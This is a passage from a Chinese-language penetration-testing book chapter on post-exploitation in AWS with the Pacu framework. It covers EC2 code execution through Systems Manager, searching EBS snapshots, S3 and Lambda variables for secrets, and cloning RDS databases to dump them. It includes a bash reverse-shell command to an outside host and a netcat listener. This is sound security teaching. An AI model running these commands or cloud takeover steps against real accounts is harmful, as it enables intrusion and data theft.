现在，如果我们的 IP 地址是`1.1.1.1`，我们应该能够访问任何实例上的任何端口。在这一点上，我们可以像在常规内部网络渗透测试中那样攻击这些服务。

如果我们想直接在任何 EC2 实例上获得 RCE，我们可以尝试几种方法。如果您不在乎重新启动任何 EC2 实例（您应该在乎，因为我们通常不希望对客户服务器执行此操作），那么您可以使用`ec2__startup_shell_script` Pacu 模块停止所有（或指定）EC2 实例，修改它们的`userdata`以在启动时输入`root/SYSTEM`的反向 shell，然后重新启动所有这些实例。它们只会离线几分钟，但如果您不熟悉环境的设置，这可能会导致重大问题，因此通常不建议这样做。

如果我们想要在 EC2 实例上获得 RCE，并且满足了正确的条件，我们可以在 Pacu 中使用`systemsmanager__rce_ec2`模块。它尝试识别哪些 EC2 实例安装了系统管理器代理（默认或非默认），然后如果识别到任何实例，它将尝试将系统管理器角色附加到它们上。一旦完成这一步，满足正确条件的实例将显示为系统管理器`run`命令的可用目标，这允许您在目标实例上以`root/SYSTEM`用户的身份执行代码。一个示例 Pacu 命令，在 Linux 目标上运行反向 bash shell，可能看起来像这样：

```
run systemsmanager__rce_ec2 --target-os Linux --command "bash -i >& /dev/tcp/1.1.1.1/5050 0>&1"
```

提供给`--command`参数的值是一个 bash 反向 shell，将调用`1.1.1.1` IP 地址的`5050`端口。在我的服务器上（假设我控制`1.1.1.1`），我将运行一个 netcat 监听器，比如`nc -nlvp 5050`，等待我的 shell 进来。请记住，这只适用于单个实例，如果您想在多个实例上放置某种恶意软件或反向 shell，您可能需要修改您的有效载荷。您还可能需要为 Windows 主机准备另一个有效载荷。

如果在运行此模块时启用并监听`PacuProxy`，则可以省略`--command`参数。如果这样做，Pacu 将自动使用其自定义的 Linux/Windows 单行分段器来控制目标服务器。这样，您就不需要担心目标操作系统或自己想出命令。

如果我们想测试其他保护/监控功能，或者我们只是想要恶意行为，我们可以尝试启动多个 EC2 实例，用于加密货币挖矿等操作，但由于这种攻击的成本影响，几乎不应在渗透测试期间执行。只有在您的客户完全理解并希望您执行的测试时，才执行此类攻击。

我们可能想尝试的另一种攻击是检查帐户中的 EBS 卷和快照。我们可以通过几种方式来做到这一点，但基本上这些是步骤：

1.  创建您想要查看的 EBS 卷的快照。

1.  与攻击者帐户共享该快照，或在受损帐户中创建一个 EC2 实例。

1.  从您创建的快照创建一个新的 EBS 卷。

1.  在您的 EC2 实例上挂载 EBS 卷。

1.  在挂载的卷的文件系统中搜索秘密。

跨帐户共享 EBS 快照的好处是，您可以在自己的帐户中使用 EC2 来检查所有内容，但通常共享/公共 EBS 快照会被许多配置检查器审计，这意味着您可能会被标记并被发现。在受损帐户中使用 EC2 实例的好处是，您可以避免跨帐户共享快照，但您可能会在任何时候被发现并删除。

`ebs__explore_snapshots` Pacu 模块是为了自动化这个过程而构建的。您只需运行它，并传入帐户中 EC2 实例的实例 ID 和其可用区，然后它将循环遍历帐户中的所有 EBS 卷（每次几个），将它们挂载到您的 EC2 实例，然后等待您完成搜索文件系统。完成后，它将分离所有附加到您的实例的卷，删除它们，然后还将删除它创建的任何快照。运行此模块的示例命令可能如下所示：

```
          run ebs__explore_snapshots --instance-id i-0f4d19t8701d76a09 --zone us-east-1a
```

然后，它将逐步将 EBS 卷附加到该实例的可用区`us-east-1a`，允许您一次检查它们的小组，并在此之后为您清理一切。

# Lambda 中的代码审查和分析

Lambda 是另一个非常常见和非常富有成效的服务，就像我们在 Lambda 渗透测试章节中看到的那样。

我们要做的第一件事是使用`lambda__enum` Pacu 模块在目标帐户中枚举 Lambda 函数。我们可以像这样运行它，不带任何参数：

```
          run lambda__enum
```

完成后，我们可以运行`data Lambda`来查看枚举的函数数据。要开始审查过程，我们应该循环遍历每个函数，并查看与之关联的环境变量，以尝试找到一些可能在我们的攻击中有用的敏感数据/值。

在检查环境变量以获取有趣数据后，如果我们发现了任何内容，比如发现了 API 密钥或密码，那么我们将希望截图并做笔记，以便向客户报告。如果我们发现的内容在某种程度上可以被滥用，那么现在可能是这样做的时候，但只有在仍然在您的参与范围内时才这样做。有时，您发现的秘密将属于第三方服务，您可能不应该攻击它们，但其他时候，如果您可以通过特权升级或跨 AWS 账户访问某个地方，那么确认与您的客户联系人后，这可能是值得的。

完成后，您可以浏览 Pacu Lambda 数据并下载每个 Lambda 函数的代码进行本地分析。下载后，您可以运行静态源代码安全工具，例如 Python 的 Bandit，尝试发现代码中的任何固有弱点。

在对代码进行自动化和手动审查后，如果发现了潜在的漏洞，现在就是利用它们来确认发现的时候。如果您发现一个 Lambda 函数由 S3 触发，然后将用户可控数据放入不安全的操作系统命令中，您可以使用此方法在 Lambda 函数上实现远程代码执行，以窃取附加 IAM 角色的 IAM 凭据。

# 在 RDS 中通过身份验证

凭借正确的 RDS 权限，我们有可能以管理员用户的身份获得对目标账户中任何 RDS 数据库实例的完全访问权限，这将授予我们对存储在其中的数据的完全访问权限。

这种攻击过程可以手动完成，也可以使用`rds__explore_snapshots` Pacu 模块。目标是滥用 RDS 数据库实例的备份，以创建现有数据库的新副本，并具有我们自己的私有访问权限。如果我们获得了对 RDS 的访问权限，并且只有一个实例且没有备份，那么该过程将包括以下步骤：

1.  创建运行中数据库实例的快照。

1.  将该快照恢复到一个新的数据库实例。

1.  将我们新数据库实例的主密码更改为我们知道的内容。

1.  将数据库更改为公开访问，并修改任何安全组规则以允许我们入站访问正确的端口。

1.  使用我们设置的凭据连接到数据库。

1.  使用类似`mysqldump`的工具来外泄整个数据库。

一旦连接，它将是账户中单个生产数据库的完整副本，这意味着我们可以随心所欲地使用它。根据数据库中的数据量，一个明智的举措是使用类似`mysqldump`的工具将 SQL 数据库外泄到手动检查或导入到另一个外部数据库，这样就不会有任何访问被撤销的风险。确保在完成时删除您创建的原始数据库的快照和数据库实例；否则，您可能会在目标账户中产生一些费用。这可能有几个原因不好，包括让您的客户生气和/或被计费警报捕捉到您的活动。

这是一个可以手动完成的简单过程，但通常最好自动化，这样您就不会在过程中犯任何手动错误并搞砸生产数据库。您可以简单地运行以下 Pacu 命令来自动化大部分数据库实例的过程（使用`--region`标志指定特定区域）：

```
run rds__explore_snapshots
```

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/067a9c2b-06f5-40a3-8683-768393a778c7.png)

`rds__explore_snapshots`模块的一部分输出

前面的截图显示了`rds__explore_snapshots`模块的部分输出。它将扫描您指定的区域以查找 RDS 实例，给出它们的名称，然后提示您是否要复制它。如果选择是，它将创建该数据库的快照，将该快照恢复到一个新的数据库，修改主密码，然后提供连接凭据。然后，您可以使用`mysqldump`之类的工具转储数据库，或者从数据库中获取您需要的特定数据。之后，您可以按*Enter*键在 Pacu 中继续进行下一个可用的数据库，然后该模块将删除它刚刚创建的数据库快照和数据库实例。如果模块在任何过程中出现故障，它将尝试清理之前运行时留下的任何未完成的资源。这样，您就不需要担心删除为攻击创建的任何资源。

关于对 RDS 的这次攻击的另一个有趣的点是，修改主密码与一大堆其他配置更改捆绑在一起，因此并不一定是一个高度监控的 API 调用。它使用 RDS 的`ModifyDbInstance` API 来更改主密码，但同样的 API 也用于修改网络设置、监控设置、认证设置、日志设置等等。

# S3 的认证方面

关于 AWS S3 已经有大量的研究，但从认证方面来看，情况有所不同。在利用阶段进入 S3 时，大部分过程都围绕着识别不应该公开的公共资源（存储桶/对象），但它不仅仅是如此。现在是时候审查围绕 S3 构建的自动化，并看看它是否可以被利用，也是时候审查各种存储桶的内容，看看你是否可以从中获得进一步的访问权限。

客户知道他们的开发人员可以访问 X、Y 和 Z 的 S3 存储桶可能会有所帮助，你发现存储在 Y 存储桶中的私有 SSH 密钥导致了 EC2 实例的受损，进而提供了更多的 AWS 凭证等等。不遵循最小权限原则的客户往往会面临各种攻击，特别是在 S3 中。

在审查存储在 S3 中的文件时，通常需要花费太长时间来查看每个存储桶中的每个文件，因此最好优先考虑您要寻找的内容。通常，存储桶、文件和文件夹名称将是判断文件是否值得查看的最佳指标。像`names.txt`这样的文件可能不值得您的时间，但像`backup.sql`这样的文件可能值得您的时间。通常，最好搜查这些文件以查找凭据、API 密钥、客户数据或任何敏感内容。您可以使用这些数据来显示权限升级路径、跨账户妥协攻击等等，具体取决于您找到的数据类型。也许它为您提供了访问他们企业网站的权限，或者他们内部 VPN 的权限。可能性是无穷无尽的，这一切取决于您找到了什么。

在寻找公共资源时，最好通知客户所有发现，即使内容并不敏感。如果整个存储桶设置为公开，某人可能会不小心上传一个不应该公开的文件，或者如果存储桶是公开可列出的，找到存储桶名称的用户将能够枚举存储桶中的每个文件。重要的是要注意，即使存储桶中的文件需要公开，存储桶也不需要公开可列出。

在审查围绕 S3 构建的自动化时，最好检查每个存储桶上的 S3 事件和日志记录。这样，你可以看到它们如何对其私有存储桶中的活动做出反应（或不做出反应）。

S3 存储桶和文件名也可以作为环境内的一种类型的侦察。通常，您可以根据 S3 存储桶名称发现账户内正在使用某些 AWS 服务。许多服务和功能将自动创建具有模板名称的 S3 存储桶，因此在这种情况下很容易进行相关性分析。

# 合规审计和最佳实践

除了对 AWS 服务和资源的直接利用之外，还重要的是在尽可能多的位置为您的客户提供一般的安全审计。这些类型的检查通常属于一小组类别：

+   **公共访问**：

+   X 是否可以公开访问？这是否应该是可能的？

+   **加密**：

+   Y 是否在静止状态下加密？Z 是否在传输中加密？

+   **日志**：

+   C 的日志是否已启用？是否对这些日志进行了处理？

+   **备份**：

+   D 是否已备份？备份频率如何？

+   **其他安全控制**：

+   是否使用 MFA？

+   密码策略强度？

+   对正确的资源进行删除保护？

当然，除了这几个之外，还有更多内容，但通常这些是最常见的发现类型。

已经有许多工具可以提供对环境的这种洞察，包括以下内容：

+   Prowler

+   Security Monkey

+   Scout2/ScoutSuite

还有许多其他工具，它们都与下一个工具有些不同，因此最终选择使用哪一个通常是个人选择。

# 摘要

AWS 渗透测试是一个需要广泛知识和奉献精神的复杂过程，而且它确实是一个永无止境的过程。AWS 始终会发布新的服务和功能，因此对于这些服务总会有新的安全检查和攻击。

作为渗透测试人员，很难说您已经完成了对 AWS 环境的渗透测试，因为它们可能是如此庞大和复杂，因此重要的是尽可能攻击尽可能多的不同服务，同时要在您与客户达成的时间表内完成。

您进行的每次真实世界渗透测试可能会大不相同。由于 AWS 及其提供的规模和复杂性，人们在任何地方都会以不同的方式进行操作，因此重要的是永远不要感到舒适，而是始终期望学习、教导和取得成功。

我们希望您在本章关于真实世界的 AWS 渗透测试中所学到的内容可以帮助您在自己的工作中推动整个 AWS 安全社区向前发展。我们涵盖了初始渗透测试启动以及未经身份验证和经过身份验证的侦察，包括枚举我们的权限。然后，我们继续通过 IAM 配置错误来提升这些权限，然后使用我们提升的访问权限在环境中建立持久性手段。在我们的访问权限得到保障后，我们继续进行 AWS 服务的一般后渗透，这是真正的魔术发生的地方。除此之外，我们简要介绍了如何识别和汇总合规性和最佳实践检查，以向我们的客户提供全面有用的报告。

AWS 渗透测试是一个有趣而复杂的过程，只能不断扩展，所以现在我们需要您走出去，贡献您的知识和经验，为所有用户创造一个安全的 AWS 体验。
